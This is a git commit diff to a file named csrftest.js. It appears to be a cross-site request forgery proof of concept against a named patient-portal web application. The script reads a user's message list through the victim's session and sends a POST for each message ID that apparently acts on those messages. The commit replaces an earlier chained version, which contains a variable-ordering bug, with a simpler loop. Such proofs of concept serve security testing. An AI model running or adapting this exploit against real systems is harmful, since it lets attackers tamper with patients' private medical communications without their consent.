edef28a60145854dc9ec99d1a3fe2a11be3cb6b4
cybertron10 <56225601+cybertron10@users.noreply.github.com>
2020-08-22 20:30:24 -0400

    Update csrftest.js

--- csrftest.js
+++ csrftest.js
@@ -1,29 +1,4 @@
    var req = new XMLHttpRequest();
-   var req2 = new XMLHttpRequest();
-
-   req2.onreadystatechange = function()
-   {
-    if (req2.readyState == 4 && req2.status == 200 )
-    {
-       req3.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=4&rows=20&page=1");
-       req3.send();
-       req3.onreadystatechange = function()
-       {
-         if (req3.readyState == 4 && req3.status == 200 )
-       {
-          reponse_obj = JSON.parse(req.responseText);
-          for (var i = 0; i < reponse_obj.rows.length; i++) {
-          var row = reponse_obj.rows[i];
-          console.log(row.id);
-          var req3 = new XMLHttpRequest();
-          req3.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id+"&nact=1", true);
-          req3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-          req3.send();
-       }
-      }
-     };
-    }
-   };
 
    req.onreadystatechange = function()
    {
@@ -33,13 +8,13 @@
      for (var i = 0; i < reponse_obj.rows.length; i++) {
      var row = reponse_obj.rows[i];
      console.log(row.id);
-     var req2 = new XMLHttpRequest();
-     req2.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=1&msgid="+row.id+"&nact=1", true);
-     req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-     req2.send();
+     var req3 = new XMLHttpRequest();
+     req3.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id+"&nact=1", true);
+     req3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+     req3.send();
      }
    }
 };
 
-     req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=3&rows=20&page=1");
+     req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=4&rows=20&page=1");
      req.send();
